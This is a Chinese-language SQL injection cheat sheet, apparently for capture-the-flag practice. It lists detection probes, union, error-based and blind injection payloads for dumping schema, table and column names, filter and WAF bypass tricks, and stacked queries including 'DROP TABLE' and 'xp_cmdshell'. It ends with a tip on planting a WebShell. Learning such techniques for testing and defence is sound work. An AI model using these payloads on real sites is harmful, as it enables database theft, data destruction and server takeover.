# SQL注入

## 描述
通过控制SQL查询语句中的参数，执行非预期的SQL命令，从而获取数据库数据或进行服务器提权。

## 触发条件
- URL中存在参数（如 `?id=1`、`?page=2`）。
- 存在搜索框、登录框等用户输入点。

## 检测方法（快速验证）
1. **单引号测试**：在参数后加 `'`，观察是否报错（如 `You have an error in your SQL syntax`）。
2. **逻辑测试**：
   - `?id=1 AND 1=1` → 正常返回
   - `?id=1 AND 1=2` → 异常或空结果（说明存在数字型注入）
   - `?id=1' AND '1'='1` → 正常
   - `?id=1' AND '1'='2` → 异常（字符型注入）
3. **联合查询测试**：`?id=1 UNION SELECT 1,2,3`，观察是否显示数字。

## 利用方式
- **报错注入**：利用 `updatexml()`、`floor()` 等函数直接输出数据。
- **联合查询**：`UNION SELECT` 获取表名、字段、数据。
- **布尔盲注**：通过 `AND IF(1=1, true, false)` 逐字符猜解。
- **时间盲注**：使用 `SLEEP(5)` 或 `BENCHMARK()` 判断条件真伪。
- **堆叠注入**：`; DROP TABLE xxx` 或 `; EXEC xp_cmdshell`（需支持多语句）。

## 常用Payload
- 获取数据库名：`UNION SELECT group_concat(schema_name) FROM information_schema.schemata`
- 获取表名：`UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()`
- 读取字段：`UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'`
- 读取flag：`UNION SELECT flag FROM flag`

## 绕过技巧
- **空格过滤**：使用 `/**/` 或 `%0a` 代替空格。
- **关键字过滤**：双写 `UNunionION`，或使用注释 `/*!50000SELECT*/`。
- **引号过滤**：使用十六进制表示字符串（如 `0x61646d696e`）。
- **WAF绕过**：使用 `%00` 截断、参数污染、编码绕过。

## 注意
- 测试时优先使用 `--batch` 参数，避免交互。
- 若存在堆叠注入，可尝试写入WebShell。